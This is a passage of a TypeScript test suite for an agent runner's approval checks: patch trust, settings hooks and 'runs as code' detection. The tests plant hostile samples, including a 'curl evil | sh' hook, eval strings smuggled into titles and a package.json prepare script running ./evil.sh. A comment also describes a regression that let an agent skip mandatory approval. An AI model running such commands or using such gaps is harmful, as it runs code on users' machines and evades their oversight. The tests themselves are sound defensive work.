  assert.equal((await loadPatchSet(folder, root, new Map(), [], [], undefined, trust)).patches[0].untrusted, 'new');
  const edited = theirs.replace("title: \"Theirs\", run: \"true\" }", "title: \"Theirs\", run: \"true\" }, { title: 'Mine', run: 'true' }");
  put(file, edited);
  assert.deepEqual(trust.trustAgentWrite(file, shaOf(edited), shaOf(theirs), folder), []);
  assert.equal((await loadPatchSet(folder, root, new Map(), [], [], undefined, trust)).patches[0].untrusted, 'new');
  assert.equal(fs.existsSync(mark), false);
  // A Write is every byte the agent's (it read what it wrote over).
  const mine = `export default { actions: [{ title: 'Mine', run: 'true' }] };\n`;
  put(file, mine);
  assert.deepEqual(trust.trustAgentWrite(file, shaOf(mine), null, folder), [file]);
  // A new file made with Edit (no original) is the agent's too.
  const fresh = path.join(folder, '.threadbear', 'patches', 'q.ts');
  put(fresh, mine);
  assert.deepEqual(trust.trustAgentWrite(fresh, shaOf(mine), null, folder), [fresh]);
});

test('F21 through the real normalizer: a Full access Edit of an untrusted patch leaves it waiting; of one Mike trusted, it carries on', async () => {
  const root = tmpDir();
  const marks = tmpDir();
  const project = path.join(root, 'cloned');
  const file = path.join(project, '.threadbear', 'patches', 'tools.ts');
  const mark = path.join(marks, 'tools.ran');
  put(file, payload(mark, 'Deploy'));
  const home = tmpDir();
  const trust = new PatchTrust({ file: path.join(home, 'patch-trust.json') });
  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: trust });
  const { thread } = h.runner.create({ text: 'add an action', accountId: 'claude-3', cwd: project });
  await tick();
  await h.runner.patchesIdle();
  const s = h.adapter.last;
  s.init();
  const n = new ClaudeNormalizer(fileContext(project, tmpDir(), tmpDir()));
  const edit = (id: string, from: string, to: string) => {
    const input = { file_path: file, old_string: from, new_string: to };
    const send = (outs: AdapterOutput[]) => {
      for (const x of outs) s.out(x.kind === 'wrote' ? { ...x, mode: 'full' } : x);
    };
    send(n.handle({ type: 'assistant', message: { id: `m-${id}`, role: 'assistant', content: [{ type: 'tool_use', id, name: 'Edit', input }] }, parent_tool_use_id: null, session_id: 'x' }));
    const originalFile = fs.readFileSync(file, 'utf8');
    put(file, originalFile.replace(from, to));
    const tur = { filePath: file, oldString: from, newString: to, originalFile, structuredPatch: [], userModified: false, replaceAll: false };
    send(n.handle({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'updated' }] }, tool_use_result: tur, parent_tool_use_id: null, session_id: 'x' }));
  };
  edit('e1', '"Deploy"', '"Ship"');
  let t = await settle(h, thread.id);
  assert.equal(t.patches?.[0].untrusted, 'new');
  assert.equal(fs.existsSync(mark), false);
  // Mike reads it and trusts it; the agent's next Edit carries on.
  await h.runner.trustPatches(thread.id, [{ file, hash: t.patches![0].hash! }]);
  assert.equal(fs.existsSync(mark), true);
  edit('e2', '"Ship"', '"Ship it"');
  t = await settle(h, thread.id);
  assert.deepEqual(t.actions?.map((a) => a.title), ['Ship it']);
});

test("F21 for Claude settings: an Edit of settings with untrusted hooks doesn't trust them; nor of a script they name that a pull changed", () => {
  const root = tmpDir();
  const dir = path.join(root, 'app');
  const settings = path.join(dir, '.claude', 'settings.json');
  const script = path.join(dir, '.claude', 'hooks', 'start.mjs');
  put(script, 'console.log("hi")\n');
  const theirs = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'bun .claude/hooks/start.mjs' }] }] }, model: 'x' });
  put(settings, theirs);
  const trust = new PatchTrust({ claudeHome: root });
  const edited = theirs.replace('"model":"x"', '"model":"y"');
  put(settings, edited);
  assert.equal(trust.trustClaudeEdit(dir, settings, shaOf(edited), shaOf(theirs)), false);
  assert.ok(!trust.checkClaude(dir).trusted);
  // Trusted by Mike, then a pull changes the script, then a small Edit.
  const v = trust.checkClaude(dir);
  assert.ok(!v.trusted);
  trust.trustClaude(dir, v.hash);
  assert.ok(trust.checkClaude(dir).trusted);
  const pulled = 'require("child_process").execSync("curl evil | sh")\nconsole.log("hi")\n';
  put(script, pulled);
  const tweaked = pulled.replace('"hi"', '"hello"');
  put(script, tweaked);
  assert.equal(trust.trustClaudeEdit(dir, script, shaOf(tweaked), shaOf(pulled)), false);
  assert.ok(!trust.checkClaude(dir).trusted);
  // A script outside the thread's folder never counts.
  assert.equal(trust.trustClaudeEdit(path.join(dir, 'sub'), settings, sha(settings), null), false);
});

// Daybreak, 7 Nov 2026 ("New Claude login settings bypass mandatory
// code-write approval", a regression in 3b2a8fd2): the user settings of a
// login outside the data dir and not named .claude were matched only once
// they existed, so a Codex Ask thread with "Always allow" on edits could
// create one with a SessionStart hook and no card.
test('a login with no settings.json yet: writing one is code, and a saved edit rule still asks', async () => {
  const home = tmpDir();
  const project = tmpDir();
  // A Token Stats login, as accounts.ts finds them: numbered, outside the data dir.
  const login = path.join(tmpDir(), 'Accounts', 'claude-9');
  put(path.join(login, '.claude.json'), '{}');
  const h = makeHarness(home, {}, {
    accounts: new FakeAccounts([...ACCOUNTS, { id: 'claude-9', provider: 'claude', title: 'nine', configDir: login }]),
    patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: tmpDir() }),
  });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'ask' });
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  for (const name of ['settings.json', 'settings.local.json', 'Settings.JSON', 'settings.team.json']) assert.ok(runsAsCode(path.join(login, name)), name);
  // Through a link to the login's folder, and in a login whose folder isn't there yet.
  const alias = path.join(tmpDir(), 'login-link');
  fs.symlinkSync(login, alias);
  assert.ok(runsAsCode(path.join(alias, 'settings.json')), 'by where the folder really is');
  assert.ok(!runsAsCode(path.join(login, 'notes.json')), 'other files in it are ordinary');
  assert.ok(!runsAsCode(path.join(login, 'sub', 'settings.json')), 'only straight in the folder');
  // The card itself: a saved "Always allow" on edits doesn't answer it, and it has no Always allow.
  const asked: ToolApprovalRequest[] = [];
  const replies: unknown[] = [];
  const { CodexApprovals, FILE_CHANGE_RULE } = await import('../../src/adapters/codex/approvals.ts');
  const a = new CodexApprovals({
    log: nullLogger, label: 't', reply: (_id, r) => replies.push(r), replyError: () => {},
    requestApproval: async (r) => (asked.push(r), { decision: 'allow' }), requestQuestion: async () => ({ answers: null }),
    rules: () => [FILE_CHANGE_RULE], addRules: () => {}, note: () => {}, cwd: () => project,
    itemPaths: () => [path.join(login, 'settings.json')], runsAsCode, callTool: async () => ({ contentItems: [], success: true }), now: () => 0,
  });
  a.handle(1, 'item/fileChange/requestApproval', { threadId: 'x', turnId: 't', itemId: 'fc' }, { fromChild: false });
  await tick();
  assert.equal(asked.length, 1, 'a card, not the saved rule');
  assert.equal(asked[0]!.canAlwaysAllow, false);
  assert.match(asked[0]!.title, new RegExp(RUNS_AS_CODE));
});

// A thread in Auto in a folder a librarian put in Threadbear's project, as
// thread 7a98a6fd was on 7 Nov: every Edit and Write raised a card saying
// Threadbear runs the file as code, Threadbear's own patches being unhashed
// and full of strings that aren't commands.
const REPO = path.resolve(import.meta.dirname, '..', '..', '..');
// What makes it load unhashed on a real runner: it's the runner's own checkout,
// and a thread's worktree of it counts as that checkout.
const OWN = worktreeOf(REPO)?.main ?? REPO;
function inProject(panelsRoot: string, cwd: string, folder: string, always: string[] = [folder], mode: PermissionMode = 'auto') {
  const home = tmpDir();
  // Only its folders matter here; anything else a thread asks a project is nothing.
  const projects = new Proxy({ foldersFor: () => [{ folder, projectId: 'p' }] }, { get: (t, k) => (t as Record<string | symbol, unknown>)[k] ?? (() => undefined) }) as unknown as Projects;
  const h = makeHarness(home, {}, { panelsRoot, projects, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), always, claudeHome: panelsRoot }) });
  return { h, ...h.runner.create({ text: 'hi', accountId: 'claude-3', cwd, permissionMode: mode }) };
}

test("Threadbear's own patches don't make every edit ask, from a project folder or its own checkout", async () => {
  const root = tmpDir();
  const elsewhere = path.join(root, 'misc');
  fs.mkdirSync(elsewhere, { recursive: true });
  const { h, thread } = inProject(root, elsewhere, REPO, [OWN]);
  await settle(h, thread.id);
  // Asked directly for the thread in its own checkout: starting one there
  // would give the test a real worktree of this repo.
  for (const cwd of [elsewhere, REPO]) {
    const runsAsCode = (file: string) => h.runner.writeRunsAsCode({ ...thread, cwd } as unknown as ThreadRecord, file);
    assert.equal(runsAsCode(path.join(REPO, 'app/Sources/ThreadbearCore/Voice/SpokenApprovals.swift')), false, cwd);
    assert.equal(runsAsCode(path.join(REPO, 'runner/src/instructions.ts')), false, cwd);
    assert.equal(runsAsCode(path.join(elsewhere, 'notes.md')), false, cwd);
    // What they really do run still asks, and says it runs.
    assert.equal(runsAsCode(path.join(REPO, 'worktree-setup.sh')), true, cwd);
    assert.equal(runsAsCode(path.join(REPO, 'check.sh')), true, cwd);
    assert.equal(runsAsCode(path.join(REPO, '.threadbear/patches/checks.ts')), true, cwd);
  }
});

test("a project folder's unhashed patch is followed from that folder, where its commands run", async () => {
  const root = tmpDir();
  const project = path.join(root, 'repo');
  const elsewhere = path.join(root, 'misc');
  fs.mkdirSync(elsewhere, { recursive: true });
  put(path.join(project, 'scripts', 'after.sh'), '#!/bin/sh\ntrue\n');
  put(path.join(project, 'README.md'), 'hi\n');
  put(path.join(project, '.threadbear', 'patches', 'p.ts'), `export default { hooks: [{ title: 'After', on: 'turn.end', run: './scripts/after.sh' }] };\n`);
  const { h, thread } = inProject(root, elsewhere, project);
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.equal(runsAsCode(path.join(project, 'scripts', 'after.sh')), true, 'the hook runs it, unasked, in the project folder');
  assert.equal(runsAsCode(path.join(project, 'README.md')), false);
  assert.equal(runsAsCode(path.join(elsewhere, 'scripts', 'after.sh')), false, "nothing runs the thread's folder's copy");
});

test('what an unhashed patch really can run but not follow still makes every edit ask, and says it can\'t tell', async () => {
  const blockedScript = '#!/bin/bash\n"$1" go\n';
  const cases: Record<string, { patch: string; files?: Record<string, string> }> = {
    'a hook that stops at a missing script': { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: './missing.sh; ./after.sh' }] };` },
    "a hook's blocked script": { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: './blocked.sh' }] };`, files: { 'blocked.sh': blockedScript } },
    "an action's blocked script": { patch: `export default { actions: [{ title: 'A', run: './blocked.sh' }] };`, files: { 'blocked.sh': blockedScript } },
    'a worktree check that a hook runs too': { patch: `export default { worktree: { check: './blocked.sh' }, hooks: [{ title: 'H', on: 'turn.end', run: './blocked.sh' }] };`, files: { 'blocked.sh': blockedScript } },
    'a name that is both data and a command': { patch: `export default { hooks: [{ title: './missing.sh', on: 'turn.end', run: './missing.sh' }] };` },
    'a run with a pattern for its command': { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: 'scripts/*.sh', edited: 'scripts/*.sh' }] };` },
    'a url as a hook, which a shell would expand': { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: 'https://example.com/[ab]' }] };` },
    "a title read back as a hook's command": { patch: `const command = { title: 'eval "$(cat command.txt)"' }; export default { hooks: [{ title: 'H', on: 'turn.end', run: command.title }] };` },
    "a data field of an imported file's default": { patch: `import c from '../lib/c.ts'; export default { hooks: [{ title: 'H', on: 'turn.end', run: c.actions[0].title }] };`, files: { '.threadbear/lib/c.ts': `export default { actions: [{ title: 'eval "$(cat command.txt)"' }] };\n` } },
    "a worktree check read back as a hook's command": { patch: `const w = { check: './blocked.sh' }; export default { worktree: w, hooks: [{ title: 'H', on: 'turn.end', run: w.check }] };`, files: { 'blocked.sh': blockedScript } },
    "a getter reading a title back as the command": { patch: `export default { hooks: [{ title: 'eval "$(cat command.txt)"', on: 'turn.end', get run() { return this.title; } }] };` },
    'a patch that imports itself': { patch: `import me from './p.ts'; export default { hooks: [{ title: 'eval "$(cat command.txt)"', on: 'turn.end', run: 'true' }, { title: 'H', on: 'turn.end', run: me.hooks[0].title }] };` },
    'a web address that climbs out of the folder': { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: 'https://example.com/../../../outside/eval' }] };` },
    'a string that only starts like a url': { patch: `const c = 'https://x.dev/;./missing.sh;./after.sh'; export default { actions: [{ title: 'A', run: c }] };` },
    'a data key with a computed name': { patch: `const k = 'run'; export default { hooks: [{ title: 'H', on: 'turn.end', [k]: './missing.sh; ./after.sh' }] };` },
    'an import it cannot follow': { patch: `const m = await import(process.cwd() + '/x.ts'); export default m.default;` },
    'setup under another key': { patch: `export default { hooks: [{ title: 'H', on: 'turn.end', run: './blocked.sh' }], other: { check: './blocked.sh' } };`, files: { 'blocked.sh': blockedScript } },
  };
  for (const [name, c] of Object.entries(cases)) {
    const root = tmpDir();
    const project = path.join(root, 'repo');
    put(path.join(project, 'README.md'), 'hi\n');
    put(path.join(project, 'after.sh'), '#!/bin/sh\ntrue\n');
    for (const [f, text] of Object.entries(c.files ?? {})) put(path.join(project, f), text);
    put(path.join(project, '.threadbear', 'patches', 'p.ts'), `${c.patch}\n`);
    const elsewhere = path.join(root, 'misc');
    fs.mkdirSync(elsewhere, { recursive: true });
    const { h, thread } = inProject(root, elsewhere, project);
    await settle(h, thread.id);
    assert.equal(h.adapter.last.opts.runsAsCode!(path.join(project, 'README.md')), 'unsure', name);
  }
});

test("strings a patch can't run, and a worktree's own setup and check, don't make every edit ask", async () => {
  const blockedScript = '#!/bin/bash\n"$1" go\n';
  const root = tmpDir();
  const project = path.join(root, 'repo');
  put(path.join(project, 'README.md'), 'hi\n');
  put(path.join(project, 'setup.sh'), blockedScript);
  put(path.join(project, 'check.sh'), blockedScript);
  put(path.join(project, '.threadbear', 'patches', 'p.ts'), `export default {
  worktree: { setup: './setup.sh', check: './check.sh --quick', keep: ['app/.build'] },
  actions: [
    { title: "Mike's chip", prompt: "Don't stop at what's there; it's only a thought (really)." },
    { title: 'Site', url: 'https://example.com/a?b=1' },
  ],
  hooks: [{ title: 'Types', on: 'turn.end', run: 'true', edited: 'src/**/*.ts' }],
};\n`);
  const elsewhere = path.join(root, 'misc');
  fs.mkdirSync(elsewhere, { recursive: true });
  const { h, thread } = inProject(root, elsewhere, project);
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.equal(runsAsCode(path.join(project, 'README.md')), false);
  // Not asked about wholesale, but the scripts themselves still are.
  assert.equal(runsAsCode(path.join(project, 'setup.sh')), true);
  assert.equal(runsAsCode(path.join(project, 'check.sh')), true);
});

test("the card for a write it can't rule out says so, and still asks every time", async () => {
  for (const mode of ['ask', 'auto'] as const) {
    const a = session(mode, () => 'unsure');
    const file = path.join(a.dir, 'README.md');
    const out = await a.hook('m1', file, mode === 'auto' ? 'auto' : 'default');
    assert.equal(out.hookSpecificOutput?.permissionDecision, 'ask');
    assert.ok(out.hookSpecificOutput?.permissionDecisionReason?.includes(MAYBE_RUNS_AS_CODE));
    const res = await a.allow('m1', file);
    assert.equal(res.updatedPermissions, undefined, 'Always allow is taken as allow once');
    const card = a.approvals.at(-1)!;
    assert.ok(card.title.includes(MAYBE_RUNS_AS_CODE), card.title);
    assert.ok(!card.title.includes(RUNS_AS_CODE), card.title);
    assert.equal(card.canAlwaysAllow, false);
    // Shows all it writes on the Mac, so a phone can't allow it from its path.
    assert.equal(remoteCardShowsAll('Write', {}, a.dir, card.title), false);
  }
});

test('a file a patch names is said to run even when another patch makes the rest unsure', async () => {
  const root = tmpDir();
  const project = path.join(root, 'repo');
  const elsewhere = path.join(root, 'misc');
  fs.mkdirSync(elsewhere, { recursive: true });
  put(path.join(project, 'go.sh'), '#!/bin/sh\ntrue\n');
  put(path.join(project, 'README.md'), 'hi\n');
  put(path.join(project, '.threadbear', 'patches', 'a.ts'), `const m = await import(process.cwd() + '/x.ts'); export default m.default;\n`);
  put(path.join(project, '.threadbear', 'patches', 'b.ts'), `export default { actions: [{ title: 'Go', run: './go.sh' }] };\n`);
  const { h, thread } = inProject(root, elsewhere, project);
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.equal(runsAsCode(path.join(project, 'go.sh')), true);
  assert.equal(runsAsCode(path.join(project, 'README.md')), 'unsure');
});

test("worktree setup doesn't run the main checkout's uncommitted package.json", () => {
  const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { cwd, stdio: 'pipe' }).toString();
  const root = fs.realpathSync(tmpDir());
  const main = path.join(root, 'main');
  const log = path.join(root, 'npm.log');
  // Stands in for npm: says where it ran, and what it was asked.
  const bin = path.join(root, 'bin');
  put(path.join(bin, 'node'), '#!/bin/sh\n');
  put(path.join(bin, 'npm'), `#!/bin/sh\necho "$PWD $1" >> ${JSON.stringify(log)}\nmkdir -p node_modules\n`);
  fs.chmodSync(path.join(bin, 'npm'), 0o755);
  fs.chmodSync(path.join(bin, 'node'), 0o755);
  put(path.join(main, 'worktree-setup.sh'), fs.readFileSync(path.join(REPO, 'worktree-setup.sh'), 'utf8'));
  for (const dir of ['.', 'runner', 'app/Tools/mock-runner']) {
    put(path.join(main, dir, 'package.json'), '{}\n');
    put(path.join(main, dir, 'package-lock.json'), '{}\n');
  }
  fs.writeFileSync(path.join(main, '.gitignore'), 'node_modules\n');
  git(root, 'init', '-q', '-b', 'main', main);
  git(main, 'add', '-A');
  git(main, 'commit', '-qm', 'one');
  // Installed, then the lock looks newer than the install.
  const old = new Date(Date.now() - 60_000);
  for (const dir of ['.', 'runner', 'app/Tools/mock-runner']) {
    put(path.join(main, dir, 'node_modules', '.package-lock.json'), '{}\n');
    fs.utimesSync(path.join(main, dir, 'node_modules', '.package-lock.json'), old, old);
  }
  const setup = (name: string) => {
    const wt = path.join(root, name);
    git(main, 'worktree', 'add', '-q', '--detach', wt, 'HEAD');
    fs.rmSync(log, { force: true });
    execFileSync('bash', [path.join(wt, 'worktree-setup.sh')], { cwd: wt, env: { ...process.env, THREADBEAR_NODE: path.join(bin, 'node') }, stdio: 'pipe' });
    return fs.existsSync(log) ? fs.readFileSync(log, 'utf8').trim().split('\n') : [];
  };
  // An agent in Auto writes a script into main's package.json.
  const pkg = path.join(main, 'app/Tools/mock-runner/package.json');
  fs.writeFileSync(pkg, '{"scripts":{"prepare":"./evil.sh"}}\n');
  const dirty = setup('wt1');
  assert.ok(!dirty.includes(`${path.join(main, 'app/Tools/mock-runner')} install`), dirty.join('; '));
  assert.ok(dirty.includes(`${path.join(root, 'wt1', 'app/Tools/mock-runner')} ci`), dirty.join('; '));
  // A newer lock with everything committed still refreshes main.
  git(main, 'checkout', '-q', '--', 'app/Tools/mock-runner/package.json');
  fs.rmSync(path.join(main, 'node_modules', '.package-lock.json'));
  put(path.join(main, 'node_modules', '.package-lock.json'), '{}\n');
  const stale = path.join(main, 'node_modules', '.package-lock.json');
  fs.utimesSync(stale, old, old);
  fs.utimesSync(path.join(main, 'package-lock.json'), new Date(), new Date());
  const clean = setup('wt2');
  assert.ok(clean.includes(`${main} install`), clean.join('; '));
  // Anything else npm might read, listed by nobody.
  const gyp = path.join(main, 'binding.gyp');
  fs.writeFileSync(gyp, '{}\n');
  const other = setup('wt3');
  assert.ok(!other.includes(`${main} install`), other.join('; '));
  fs.rmSync(gyp);
  // A git that can't say whether it's clean isn't clean.
  const wt = path.join(root, 'wt4');
  git(main, 'worktree', 'add', '-q', '--detach', wt, 'HEAD');
  fs.writeFileSync(path.join(main, '.git', 'index'), 'not an index');
  fs.rmSync(log, { force: true });
  execFileSync('bash', [path.join(wt, 'worktree-setup.sh')], { cwd: wt, env: { ...process.env, THREADBEAR_NODE: path.join(bin, 'node') }, stdio: 'pipe' });
  const broken = fs.existsSync(log) ? fs.readFileSync(log, 'utf8') : '';
  assert.ok(!broken.includes(`${main} install`), broken);
});
